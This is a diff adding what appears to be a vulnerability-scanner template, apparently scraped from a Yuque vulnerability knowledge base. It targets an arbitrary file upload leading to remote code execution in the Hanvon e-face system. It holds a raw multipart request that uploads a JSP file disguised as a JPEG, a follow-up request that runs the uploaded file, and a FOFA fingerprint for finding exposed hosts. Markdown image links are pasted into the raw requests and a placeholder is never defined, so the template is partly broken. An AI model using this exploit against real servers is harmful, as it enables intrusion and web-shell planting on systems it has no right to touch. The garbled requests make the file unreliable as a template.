@@ -1,0 +1,56 @@
+id: poc-3375160108
+info:
+  name: 汉王e脸通 monadFileUpload.do存在任意文件上传导致rce漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: rce,file-upload,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: icon_hash="1380907357"
+http:
+- raw:
+  - 'POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type= HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("Hello World!"); %>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856678617-2a57a26c-1797-4efe-b28f-e3243ab8da6b.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /manage/resource/{obj}.jsp HTTP/1.1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856678877-e334e495-9e48-44f4-9565-2bd19a960de7.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
